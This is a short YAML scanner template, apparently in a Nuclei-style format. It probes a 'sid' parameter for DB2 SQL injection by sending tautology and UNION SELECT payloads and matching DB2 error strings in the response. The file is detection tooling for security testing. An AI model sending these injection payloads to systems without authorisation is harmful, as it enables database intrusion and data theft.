id: sqli6-db2-05
name: 'SQLi db2 probe in sid'
severity: high
type: active
tags:
  - sqli
  - injection
  - db2
description: 'Triggers db2 error via sid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sid:
        - '" OR "1"="1'
        - ''' UNION SELECT NULL,NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLCODE'
          - 'DB2'
